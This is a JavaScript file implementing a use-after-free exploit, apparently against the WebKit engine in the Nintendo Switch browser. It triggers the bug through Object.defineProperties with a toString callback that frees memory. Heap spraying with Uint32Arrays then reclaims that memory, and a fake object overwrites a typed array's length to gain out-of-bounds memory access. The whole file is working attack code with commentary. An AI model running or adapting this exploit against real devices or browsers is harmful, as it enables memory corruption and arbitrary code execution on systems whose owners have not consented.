/** Class encapsulating the JailBreak. */
class JailBreak {
  /** Create a jailbreak.  */
  constructor() {
    // Create raw memory fragment.
    this.smash = new Uint32Array(0x10);

    // Stale pointer.
    this.stale = 0;

    // Date view for rew memory manipulation.
    this._dview = new DataView(new ArrayBuffer(16));
  }

  /**
   * Start the jailbreaking process.
   */
  start() {
    // Create JSArray to overlap with Uint32Array.
    var bufs = new Array(0x1000);

    // Call garbage collector.
    this._forceGC();

    // New JSArray with size of 100 elements.
    var arr = new Array(0x100);

    // Create array buffer of length 0x1000.
    var buffer = new ArrayBuffer(0x1000);

    // Save stale pointer and segmentor.
    arr[0] = buffer;
    arr[1] = 0x13371337;

    // create an object whos toString function returns number 10 and messes with arr.
    var nan = this._createNaNCracker(arr, bufs);

    // Define a new object with some properties.
    this.props = this._createPropsObject(arr, nan);

    // Target for memory overlap.
    var target = [];

    // TRIGGER BUG!
    // Set the target's properties based on the previously defined ones.
    Object.defineProperties(target, this.props);

    // Save reference to target's stale property (points to arr).
    this.stale = target.stale;

    // If stale[0] is not this value, bail.
    if (this.stale[0] == 0x41414141) {
      // Stale[0] is now pointing at a fake Integer at address 0x41414141.
      // Change it so it points to address 0x41414242.
      this.stale[0] += 0x101;

      // Log step.
      console.log("Bug exploition done...");

      // searching the whole memory that is overlaying the old arr. Looking for

      // Search memory that overlaps old arr. look for 0x41414242.
      for (var i = 0; i < bufs.length; i++) {
        for (var k = 0; k < bufs[0].length; k++) {
          // Desired value found - successfully overlaped JSArray and Uint32Array.
          // bufs[i][k] point now at the same memory as stale[0]
          if (bufs[i][k] == 0x41414242) {
            console.log("Overlapping Arrays found at bufs[" + i + "][" + k + "].\n" +
                        "Value of smash.length is: 0x" + this.smash.length.toString(16));

            // Create an object which in memory should look like:
            // 0x0100150000000136 0x0000000000000000 <- fictional value
            // 0x0000000000000064 0x0000000000000000 <- ['a'],['b']
            // 0x???????????????? 0x0000000000000100 <- ['c'],['d']
            this.stale[0] = {
              'a': this._uInt32ToFloat(105, 0), // JSObject properties; 105 is Structure ID of Uint32Array.
              'b': this._uInt32ToFloat(0, 0),
              'c': this.smash, // Points at the struct of a Uint32Array(0x10)
              'd': this._uInt32ToFloat(0x100, 0)
            }

            console.log("created the JSObject.");

            // remember the original stale pointer, pointing at the object with the a,b,c,d properties
            // Save original stale pointer to the ABCD object.
            this.stale[1] = this.stale[0];

            // Add 0x10 to the pointer of stale[0].
            // Now points to the middle of the object.
            bufs[i][k] += 0x10;

            console.log("misaligned the pointer to the JSObject.");

            // write to the 6th 32bit value of the memory pointed to by the crafted Uint32Array.
            // Should point to the struct of smash, allowing us to overwrite the length of smash.
            this.stale[0][6] = 0x1337;

            // check the length of smash is now.
            console.log('smash.length is now: 0x' + this.smash.length.toString(16));

            // Success!
            console.log('<strong>Success!</strong> Switch shold crash soon :P');
            return;
          }
        }
      }
    }

    console.log("Operation failed. Refresh the page to try again...");
  }

  /**
   * This function forces the garbage collector to be called,
   * by allocating & freeing big chunks of process memory.
   */
  _forceGC() {
    // Prepare 100 memory chunks.
    var pressure = new Array(100);

    // Might take few times to succeed.
    for (var i = 0; i < 8; ++i) {
      // Allocate 256KB for each chunk.
      for (var i = 0; i < pressure.length; i++) {
        pressure[i] = new Uint32Array(0x10000);
      }

      // Free all chunks.
      for (var i = 0; i < pressure.length; i++) {
        pressure[i] = 0;
      }
    }
  }

  /**
   * Writes two UInt32 to raw memory and returns value as Float.
   * @param {UInt32} low the lower 32-bits.
   * @param {UInt32} high the upper 32-bits.
   * @return {Float} the 64-bit floar reprensted by high-low.
   */
  _uInt32ToFloat(low, high) {
    this._dview.setUint32(0, high);
    this._dview.setUint32(4, low);
    return this._dview.getFloat64(0);
  }

  /**
   * Create a magic object that mimicks number.
   * @param {JSArray} arr array to free onString.
   * @param {JSArray} bufs the buffer to overlap with.
   */
  _createNaNCracker(arr, bufs) {
    var nan = {},
        that = this;

    nan.toString = function() {
      arr = null;
      that.props["stale"]["value"] = null;

      // If buffer already overlapping memory, bail.
      if (bufs[0]) return 10;

      // The array pointed at by arr should be gone after GC.
      that._forceGC();

      // Through the entire buffer array.
      for (var i = 0; i < bufs.length; i++) {
        // Fill it with a lot of Uint32Arrays,
        // Hopefully allocated where arr was allocated earlier.
        bufs[i] = new Uint32Array(0x100 * 2)

        // For each elements.
        for (var k = 0; k < bufs[i].length;) {
          // Set memory to 0x41414141 0xffff0000
          // spraying the JSValue 0xffff000041414141
          // which is the Integer 0x41414141
          bufs[i][k++] = 0x41414141;

          // phrack: Integer FFFF:0000:IIII:IIII
          bufs[i][k++] = 0xffff0000;
        }
      }

      return 10;
    };

    return nan;
  }

  /**
   * Create an object that mimicks array.
   * @param {JSArray} arr array to free onString.
   * @param {Object} nan the magic number object.
   */
  _createPropsObject(arr, nan) {
    return {
      p0: { value: 0 },
      p1: { value: 1 },
      p2: { value: 2 },
      p3: { value: 3 },
      p4: { value: 4 },
      p5: { value: 5 },
      p6: { value: 6 },
      p7: { value: 7 },
      p8: { value: 8 },

      // When the length property is called, do naughty things.
      length: { value: nan },

      // The reference to the arr array. Which will later be freed.
      stale: { value: arr },
      after: { value: 666 }
    };
  }
}
